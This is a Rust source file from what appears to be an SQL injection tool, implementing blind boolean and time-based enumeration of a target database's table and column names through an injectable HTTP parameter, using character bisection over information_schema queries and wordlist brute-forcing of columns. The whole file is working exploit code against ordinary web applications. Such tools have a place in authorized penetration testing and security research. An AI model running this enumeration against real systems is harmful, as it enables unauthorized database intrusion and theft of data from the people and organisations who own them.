//! Schema enumeration: blind extraction of table names and column names
//! for all supported DBMS dialects.

use anyhow::Result;
use std::sync::Arc;
use tracing::info;

use crate::sqx::{
    detector::SqliDetector,
    models::{
        BlindTechnique, CancellationToken, ExtractionStatus, HttpResponse, SchemaEnumerationConfig,
        SchemaEnumerationProgress, SqliInfoExtraction,
    },
};

impl SqliDetector {
    /// Enumerate all tables in the database using blind injection.
    pub async fn enumerate_tables_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        progress_callback: Option<Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<Vec<String>> {
        let mut tables = Vec::new();
        let mut total_requests = 0;

        info!("Starting table enumeration for {} DBMS", dbms);

        let table_count = self
            .get_table_count_blind(
                url,
                param,
                original_value,
                dbms,
                config,
                baseline,
                close,
                balance,
                vector,
                time_template,
                &mut total_requests,
                cancel_token.as_ref(),
            )
            .await?;

        let tables_to_extract = table_count.min(config.max_tables);
        info!(
            "Found {} tables, extracting {} names",
            table_count, tables_to_extract
        );

        for table_index in 0..tables_to_extract {
            if let Some(ref token) = cancel_token
                && token.is_cancelled()
            {
                info!("Table enumeration cancelled after {} tables", table_index);
                break;
            }

            let table_name = self
                .extract_table_name_blind(
                    url,
                    param,
                    original_value,
                    dbms,
                    table_index,
                    config,
                    baseline,
                    close,
                    balance,
                    vector,
                    time_template,
                    &mut total_requests,
                    progress_callback.as_ref(),
                    cancel_token.as_ref(),
                )
                .await?;

            if !table_name.is_empty() {
                tables.push(table_name.clone());
                if let Some(ref callback) = progress_callback {
                    callback(SchemaEnumerationProgress {
                        phase: "tables".to_string(),
                        current_item: table_name,
                        items_found: tables.len(),
                        total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        info!(
            "Table enumeration complete: {} tables found in {} requests",
            tables.len(),
            total_requests
        );
        Ok(tables)
    }

    /// Get the count of tables in the database using bisection (O(log n) requests).
    pub(crate) async fn get_table_count_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        total_requests: &mut usize,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<usize> {
        let count_query = crate::sqx::dbms::dialect_by_name(dbms)
            .map(|d| d.table_count_query())
            .unwrap_or_else(|| "SELECT COUNT(*) FROM information_schema.tables".to_string());

        let count = match config.technique {
            BlindTechnique::Boolean => {
                self.extract_number_blind(
                    url,
                    param,
                    original_value,
                    &count_query,
                    baseline,
                    close,
                    balance,
                    vector,
                    0,
                    500,
                    total_requests,
                    cancel_token,
                )
                .await?
            }
            BlindTechnique::Time => {
                self.extract_number_time_based(
                    url,
                    param,
                    original_value,
                    dbms,
                    &count_query,
                    close,
                    balance,
                    time_template,
                    vector,
                    0,
                    500,
                    total_requests,
                    cancel_token,
                    baseline.duration,
                )
                .await?
            }
        };

        Ok(count as usize)
    }

    /// Extract a single table name using blind injection.
    pub(crate) async fn extract_table_name_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        table_index: usize,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        total_requests: &mut usize,
        progress_callback: Option<&Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>>,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<String> {
        let name_query = crate::sqx::dbms::dialect_by_name(dbms)
            .map(|d| d.table_name_query(table_index))
            .unwrap_or_else(|| {
                format!(
                    "SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {}",
                    table_index
                )
            });
        let mut name = String::new();

        for char_pos in 1..=config.max_name_length {
            if let Some(token) = cancel_token
                && token.is_cancelled()
            {
                break;
            }

            let char_value = self
                .extract_char_bisection(
                    url,
                    param,
                    original_value,
                    dbms,
                    &name_query,
                    char_pos,
                    config.technique,
                    baseline,
                    close,
                    balance,
                    vector,
                    time_template,
                    total_requests,
                )
                .await?;

            if char_value == 0 {
                break; // End of string
            }

            name.push(char_value as u8 as char);

            if let Some(callback) = progress_callback {
                callback(SchemaEnumerationProgress {
                    phase: "tables".to_string(),
                    current_item: name.clone(),
                    items_found: table_index + 1,
                    total_requests: *total_requests,
                    status: ExtractionStatus::Running,
                });
            }
        }

        Ok(name)
    }

    /// Enumerate columns for a specific table.
    pub async fn enumerate_columns_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        table_name: &str,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        progress_callback: Option<Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<Vec<String>> {
        let mut columns = Vec::new();
        let mut total_requests = 0;

        info!(
            "Starting column enumeration for table '{}' on {} DBMS",
            table_name, dbms
        );

        let column_count = self
            .get_column_count_blind(
                url,
                param,
                original_value,
                dbms,
                table_name,
                config,
                baseline,
                close,
                balance,
                vector,
                time_template,
                &mut total_requests,
                cancel_token.as_ref(),
            )
            .await?;

        let columns_to_extract = column_count.min(config.max_columns_per_table);
        info!(
            "Found {} columns in '{}', extracting {} names",
            column_count, table_name, columns_to_extract
        );

        if column_count == 0 && !config.column_wordlist.is_empty() {
            info!(
                "information_schema returned 0 columns for '{}'; attempting wordlist brute-force ({} candidates)",
                table_name,
                config.column_wordlist.len()
            );
            return self
                .brute_force_columns_blind(
                    url,
                    param,
                    original_value,
                    dbms,
                    table_name,
                    config,
                    baseline,
                    close,
                    balance,
                    vector,
                    time_template,
                    &mut total_requests,
                    progress_callback,
                    cancel_token,
                )
                .await;
        }

        for column_index in 0..columns_to_extract {
            if let Some(ref token) = cancel_token
                && token.is_cancelled()
            {
                info!(
                    "Column enumeration cancelled after {} columns",
                    column_index
                );
                break;
            }

            let column_name = self
                .extract_column_name_blind(
                    url,
                    param,
                    original_value,
                    dbms,
                    table_name,
                    column_index,
                    config,
                    baseline,
                    close,
                    balance,
                    vector,
                    time_template,
                    &mut total_requests,
                    progress_callback.as_ref(),
                    cancel_token.as_ref(),
                )
                .await?;

            if !column_name.is_empty() {
                columns.push(column_name.clone());
                if let Some(ref callback) = progress_callback {
                    callback(SchemaEnumerationProgress {
                        phase: "columns".to_string(),
                        current_item: format!("{}.{}", table_name, column_name),
                        items_found: columns.len(),
                        total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        info!(
            "Column enumeration complete for '{}': {} columns found",
            table_name,
            columns.len()
        );
        Ok(columns)
    }

    /// Brute-force column names from a wordlist when information_schema is unavailable.
    pub(crate) async fn brute_force_columns_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        table_name: &str,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        total_requests: &mut usize,
        progress_callback: Option<Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<Vec<String>> {
        let mut columns = Vec::new();
        let threshold = baseline.duration;

        for (idx, column_name) in config.column_wordlist.iter().enumerate() {
            if let Some(ref token) = cancel_token
                && token.is_cancelled()
            {
                info!("Column brute-force cancelled after {} candidates", idx);
                break;
            }

            let condition = format!(
                "(SELECT COUNT({}) FROM {})>-1",
                Self::escape_identifier(column_name),
                Self::escape_identifier(table_name)
            );

            let exists = match config.technique {
                BlindTechnique::Boolean => {
                    self.test_condition_blind(
                        url,
                        param,
                        original_value,
                        &condition,
                        baseline,
                        close,
                        balance,
                        vector,
                    )
                    .await?
                }
                BlindTechnique::Time => {
                    self.test_condition_time_based(
                        url,
                        param,
                        original_value,
                        dbms,
                        &condition,
                        close,
                        balance,
                        time_template,
                        vector,
                        threshold,
                    )
                    .await?
                }
            };
            *total_requests += 1;

            if exists {
                columns.push(column_name.clone());
                info!("Brute-force found column '{}.{}'", table_name, column_name);
                if let Some(ref callback) = progress_callback {
                    callback(SchemaEnumerationProgress {
                        phase: "columns".to_string(),
                        current_item: format!("{}.{}", table_name, column_name),
                        items_found: columns.len(),
                        total_requests: *total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }

            if columns.len() >= config.max_columns_per_table {
                info!(
                    "Column brute-force capped at {} columns",
                    config.max_columns_per_table
                );
                break;
            }
        }

        info!(
            "Column brute-force complete for '{}': {} columns found in {} requests",
            table_name,
            columns.len(),
            total_requests
        );
        Ok(columns)
    }

    /// Minimal escaping for SQL identifiers used in brute-force queries.
    fn escape_identifier(name: &str) -> String {
        if name.contains('\'')
            || name.contains('"')
            || name.contains('`')
            || name.contains(';')
            || name.contains(' ')
        {
            format!("`{}`", name.replace('`', "``"))
        } else {
            name.to_string()
        }
    }

    /// Get column count for a table using bisection (O(log n) requests).
    pub(crate) async fn get_column_count_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        table_name: &str,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        total_requests: &mut usize,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<usize> {
        let count_query = crate::sqx::dbms::dialect_by_name(dbms)
            .map(|d| d.column_count_query(table_name))
            .unwrap_or_else(|| {
                format!(
                    "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
                    table_name
                )
            });

        let count = match config.technique {
            BlindTechnique::Boolean => {
                self.extract_number_blind(
                    url,
                    param,
                    original_value,
                    &count_query,
                    baseline,
                    close,
                    balance,
                    vector,
                    0,
                    500,
                    total_requests,
                    cancel_token,
                )
                .await?
            }
            BlindTechnique::Time => {
                self.extract_number_time_based(
                    url,
                    param,
                    original_value,
                    dbms,
                    &count_query,
                    close,
                    balance,
                    time_template,
                    vector,
                    0,
                    500,
                    total_requests,
                    cancel_token,
                    baseline.duration,
                )
                .await?
            }
        };

        Ok(count as usize)
    }

    /// Extract a single column name using blind injection.
    pub(crate) async fn extract_column_name_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        table_name: &str,
        column_index: usize,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        total_requests: &mut usize,
        progress_callback: Option<&Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>>,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<String> {
        let name_query = crate::sqx::dbms::dialect_by_name(dbms)
            .map(|d| d.column_name_query(table_name, column_index))
            .unwrap_or_else(|| {
                format!("SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}", table_name, column_index)
            });
        let mut name = String::new();

        for char_pos in 1..=config.max_name_length {
            if let Some(token) = cancel_token
                && token.is_cancelled()
            {
                break;
            }

            let char_value = self
                .extract_char_bisection(
                    url,
                    param,
                    original_value,
                    dbms,
                    &name_query,
                    char_pos,
                    config.technique,
                    baseline,
                    close,
                    balance,
                    vector,
                    time_template,
                    total_requests,
                )
                .await?;

            if char_value == 0 {
                break; // End of string
            }

            name.push(char_value as u8 as char);

            if let Some(callback) = progress_callback {
                callback(SchemaEnumerationProgress {
                    phase: "columns".to_string(),
                    current_item: format!("{}.{}", table_name, name),
                    items_found: column_index + 1,
                    total_requests: *total_requests,
                    status: ExtractionStatus::Running,
                });
            }
        }

        Ok(name)
    }

    /// Extract a single character using bisection algorithm.
    pub(crate) async fn extract_char_bisection(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        query: &str,
        position: usize,
        technique: BlindTechnique,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        total_requests: &mut usize,
    ) -> Result<u8> {
        let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
        let dialect = dialect_box
            .as_deref()
            .unwrap_or(&crate::sqx::dbms::major::MySQL);
        let mut low = 32u8;
        let mut high = 126u8;

        while low < high {
            let mid = low + (high - low) / 2;

            let condition = format!(
                "({}({}(({}),{},1))>{})",
                dialect.char_code_function(),
                dialect.substring_function(),
                query,
                position,
                mid
            );

            let is_greater = match technique {
                BlindTechnique::Boolean => {
                    self.test_condition_blind(
                        url,
                        param,
                        original_value,
                        &condition,
                        baseline,
                        close,
                        balance,
                        vector,
                    )
                    .await?
                }
                BlindTechnique::Time => {
                    self.test_condition_time_based(
                        url,
                        param,
                        original_value,
                        dbms,
                        &condition,
                        close,
                        balance,
                        time_template,
                        vector,
                        baseline.duration,
                    )
                    .await?
                }
            };
            *total_requests += 1;

            if is_greater {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        let verify_condition = format!(
            "({}({}(({}),{},1))>31)",
            dialect.char_code_function(),
            dialect.substring_function(),
            query,
            position
        );
        let exists = match technique {
            BlindTechnique::Boolean => {
                self.test_condition_blind(
                    url,
                    param,
                    original_value,
                    &verify_condition,
                    baseline,
                    close,
                    balance,
                    vector,
                )
                .await?
            }
            BlindTechnique::Time => {
                self.test_condition_time_based(
                    url,
                    param,
                    original_value,
                    dbms,
                    &verify_condition,
                    close,
                    balance,
                    time_template,
                    vector,
                    baseline.duration,
                )
                .await?
            }
        };
        *total_requests += 1;

        if exists { Ok(low) } else { Ok(0) }
    }

    /// Complete schema enumeration (tables + columns).
    pub async fn enumerate_full_schema(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: &SchemaEnumerationConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        time_template: &str,
        progress_callback: Option<Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<SqliInfoExtraction> {
        let mut info = SqliInfoExtraction::default();

        let tables = self
            .enumerate_tables_blind(
                url,
                param,
                original_value,
                dbms,
                config,
                baseline,
                close,
                balance,
                vector,
                time_template,
                progress_callback.clone(),
                cancel_token.clone(),
            )
            .await?;

        info.tables = tables.clone();

        for table in &tables {
            if let Some(ref token) = cancel_token
                && token.is_cancelled()
            {
                break;
            }

            let columns = self
                .enumerate_columns_blind(
                    url,
                    param,
                    original_value,
                    dbms,
                    table,
                    config,
                    baseline,
                    close,
                    balance,
                    vector,
                    time_template,
                    progress_callback.clone(),
                    cancel_token.clone(),
                )
                .await?;

            info.columns.insert(table.clone(), columns);
        }

        Ok(info)
    }
}
